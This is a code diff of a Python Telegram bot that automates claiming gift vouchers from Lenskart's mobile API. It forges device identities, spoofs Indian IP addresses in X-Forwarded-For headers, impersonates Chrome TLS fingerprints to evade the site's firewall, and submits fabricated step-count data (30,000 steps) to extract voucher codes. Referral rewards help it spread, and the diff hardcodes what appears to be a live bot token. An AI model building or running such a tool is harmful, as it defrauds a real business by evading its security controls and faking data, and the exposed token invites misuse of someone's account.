@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-LENSKART PRO - TELEGRAM CLOUD BOT (Railway Ready V5.0)
-Features: Daily Limits, 5 Referrals for 30m VIP, God Mode Admin, Indian IP Spoofing, UI Buttons
+LENSKART PRO - TELEGRAM CLOUD BOT (Railway Ready V5.1 - WAF Bypass & Error Logging)
+Features: Daily Limits, 5 Referrals for 30m VIP, God Mode Admin, Indian IP Spoofing, UI Buttons, Robust Error Handling
 """
 
 import telebot
@@ -17,10 +17,10 @@ from datetime import datetime
 from curl_cffi import requests
 
 # ==========================================
-# 🚨 BOT CONFIGURATION (YEH ZAROOR DALNA) 🚨
+# 🚨 BOT CONFIGURATION
 # ==========================================
-BOT_TOKEN = "8860940593:AAFQVyXXU6MHS0OCpLZZ7wEVc33m-PO_IDI"       # @BotFather se token lo
-ADMIN_CHAT_ID = 6860106371                     # Apna numeric ID dalo (integer)
+BOT_TOKEN = "8860940593:AAFQVyXXU6MHS0OCpLZZ7wEVc33m-PO_IDI"
+ADMIN_CHAT_ID = 6860106371
 
 bot = telebot.TeleBot(BOT_TOKEN)
 bot_info = bot.get_me()
@@ -40,7 +40,7 @@ REQUIRED_CHATS = [
 ]
 
 def check_membership(user_id):
-    if user_id == ADMIN_CHAT_ID: return True # Admin bypass
+    if user_id == ADMIN_CHAT_ID: return True
     for chat in REQUIRED_CHATS:
         try:
             status = bot.get_chat_member(chat['id'], user_id).status
@@ -64,7 +64,6 @@ def save_db(data):
     with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)
 
 def check_user_limit(user_id):
-    """Checks if user can claim today, or if they have VIP access"""
     if user_id == ADMIN_CHAT_ID:
         return True, "Admin"
         
@@ -72,13 +71,11 @@ def check_user_limit(user_id):
     user = data.get(str(user_id), {})
     today = datetime.now().strftime("%Y-%m-%d")
     
-    # VIP Time check
     vip_until = user.get("vip_until", 0)
     if time.time() < vip_until:
         remaining = int((vip_until - time.time()) / 60)
         return True, f"VIP Active ({remaining} mins left)"
         
-    # Daily check
     last_date = user.get("last_date", "")
     used_today = user.get("used_today", 0)
     
@@ -103,7 +100,6 @@ def record_usage(user_id):
         user["used_today"] = 0
         user["last_date"] = today
         
-    # If not in VIP mode, count usage
     if time.time() > user.get("vip_until", 0):
         user["used_today"] += 1
         
@@ -118,15 +114,13 @@ def add_referral(referrer_id, new_user_id):
     if referrer_id not in data:
         data[referrer_id] = {"used_today": 0, "last_date": "", "referrals": 0, "vip_until": 0}
         
-    # Check if new user is actually new
     if new_user_id not in data:
         data[referrer_id]["referrals"] += 1
         data[new_user_id] = {"used_today": 0, "last_date": "", "referrals": 0, "vip_until": 0}
         
-        # Reward 30 mins VIP if 5 referrals hit
         if data[referrer_id]["referrals"] >= 5:
-            data[referrer_id]["referrals"] = 0 # Reset for next batch
-            data[referrer_id]["vip_until"] = time.time() + 1800 # 30 mins
+            data[referrer_id]["referrals"] = 0 
+            data[referrer_id]["vip_until"] = time.time() + 1800 
             try:
                 bot.send_message(int(referrer_id), "🎉 <b>BOOM!</b> You reached 5 referrals.\n⏱️ <b>30 MINUTES UNLIMITED VIP UNLOCKED!</b> Go crazy!", parse_mode="HTML")
             except: pass
@@ -156,7 +150,6 @@ MODELS = {"xiaomi": ["Mi 11X", "2201116PI"], "samsung": ["SM-G998B", "SM-S918B"]
 ANDROID_VERSIONS = ["12", "13", "14"]
 
 def generate_indian_ip():
-    """Generates a random Indian Mobile IP for X-Forwarded-For spoofing"""
     return f"{random.choice([103, 106, 122, 157])}.{random.randint(10, 250)}.{random.randint(10, 250)}.{random.randint(10, 250)}"
 
 class LenskartFakeDevice:
@@ -169,7 +162,9 @@ class LenskartFakeDevice:
         self.advertising_id = str(uuid.uuid4())
         self.build_version = f"TP1A.220905.00{random.randint(1,9)}"
         self.session_token = None
-        self.s = requests.Session(impersonate="chrome110")
+        
+        # Upgraded TLS Impersonation (chrome116)
+        self.s = requests.Session(impersonate="chrome116")
         self.fake_ip = generate_indian_ip()
         self.x_assertion = self.generate_x_assertion()
         
@@ -195,7 +190,7 @@ class LenskartFakeDevice:
             "brand": self.brand,
             "model": self.model,
             "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.model} Build/{self.build_version})",
-            "X-Forwarded-For": self.fake_ip,  # 🚨 NEW: Spoofs Lenskart Firewall
+            "X-Forwarded-For": self.fake_ip,
             "X-Real-IP": self.fake_ip
         }
         if self.phone:
@@ -210,10 +205,18 @@ class LenskartFakeDevice:
     def req(self, method, path, body=None):
         url = f"https://api-gateway.juno.lenskart.com{path}"
         try:
-            time.sleep(random.uniform(0.1, 0.5)) # Human delay
-            if method == "POST": return self.s.post(url, headers=self.base_headers(), json=body, timeout=20)
-            else: return self.s.get(url, headers=self.base_headers(), timeout=20)
-        except: return None
+            time.sleep(random.uniform(0.1, 0.5))
+            if method == "POST": 
+                return self.s.post(url, headers=self.base_headers(), json=body, timeout=20)
+            else: 
+                return self.s.get(url, headers=self.base_headers(), timeout=20)
+        except Exception as e:
+            # Custom mock response to ensure error is passed to the bot UI
+            class FakeResponse:
+                status_code = 500
+                text = f"Exception: {str(e)}"
+                def json(self): return {}
+            return FakeResponse()
 
 # ==========================================
 # 🤖 BOT UI & HANDLERS
@@ -232,7 +235,6 @@ def send_welcome(message):
     chat_id = message.chat.id
     user_id = message.from_user.id
     
-    # Handle Referral Logic (/start 123456)
     if len(message.text.split()) > 1:
         referrer = message.text.split()[1]
         add_referral(referrer, user_id)
@@ -332,8 +334,18 @@ def process_steps(message):
         device = LenskartFakeDevice(text)
         
         r = device.req("POST", "/v2/sessions", {})
+        
+        # 🚨 ROBUST ERROR HANDLING ADDED HERE
         if not r or r.status_code != 200:
-            bot.edit_message_text("❌ Lenskart Server Blocked. Try again.", chat_id, msg.message_id)
+            error_details = r.text[:200] if hasattr(r, 'text') else "No response from server"
+            status_code = r.status_code if hasattr(r, 'status_code') else 'N/A'
+            
+            error_msg = (
+                f"❌ <b>Lenskart Server Blocked.</b>\n\n"
+                f"⚠️ <b>Status Code:</b> {status_code}\n"
+                f"🛠 <b>WAF Response:</b> <code>{error_details}</code>"
+            )
+            bot.edit_message_text(error_msg, chat_id, msg.message_id, parse_mode="HTML")
             del user_sessions[chat_id]
             return
             
@@ -344,7 +356,7 @@ def process_steps(message):
             user_sessions[chat_id] = {"step": "wait_for_otp", "device": device}
             bot.edit_message_text(f"✅ OTP sent to {text} using IP {device.fake_ip}!\n\n🔑 <b>Please enter the OTP:</b>", chat_id, msg.message_id, parse_mode="HTML")
         else:
-            bot.edit_message_text("❌ Failed to send OTP.", chat_id, msg.message_id)
+            bot.edit_message_text(f"❌ Failed to send OTP. Status: {r.status_code if hasattr(r, 'status_code') else 'N/A'}", chat_id, msg.message_id)
             del user_sessions[chat_id]
             
     # OTP SUBMITTED
@@ -359,13 +371,13 @@ def process_steps(message):
         
         r = device.req("POST", "/v2/customers/authenticate/mobile", {"code": text, "phoneCode": "+91", "telephone": device.phone})
         if not r or r.status_code != 200:
-            bot.edit_message_text("❌ Incorrect OTP! Restart with /start.", chat_id, msg.message_id)
+            err_text = r.text[:100] if hasattr(r, 'text') else "Unknown"
+            bot.edit_message_text(f"❌ Incorrect OTP or Blocked!\nError: <code>{err_text}</code>", chat_id, msg.message_id, parse_mode="HTML")
             del user_sessions[chat_id]
             return
             
         res = r.json().get("result", {})
         device.session_token = res.get("token")
-        uid = res.get("user_id")
         
         today_midnight = int(time.time() * 1000) - (int(time.time() * 1000) % 86400000) - (5.5 * 3600 * 1000)
         payload = [{"distance": 0.0, "steps": 0 if i < 6 else 30000, "timestamp": int(today_midnight - (6-i) * 86400000)} for i in range(7)]
@@ -378,7 +390,7 @@ def process_steps(message):
                 voucher = data.get("giftVoucher")
                 tier = data.get("tier", "Tier_3")
                 
-                record_usage(user_id) # Log the usage!
+                record_usage(user_id)
                 update_score(user_id, message.from_user.first_name)
                 
                 success_msg = f"🎉 <b>COUPON EXTRACTED SUCCESSFULLY!</b> 🎉\n\n📱 <b>Number:</b> <code>{phone}</code>\n🏆 <b>Tier:</b> {tier}\n🎫 <b>Voucher Code:</b> <code>{voucher}</code>\n\n<i>Hit /start to claim more!</i>"
@@ -396,7 +408,7 @@ def process_steps(message):
 
 if __name__ == "__main__":
     print("="*50)
-    print("🤖 STARTING V5.0 ULTIMATE CLOUD BOT...")
+    print("🤖 STARTING V5.1 ULTIMATE CLOUD BOT...")
     print("="*50)
     try: bot.remove_webhook()
     except: pass
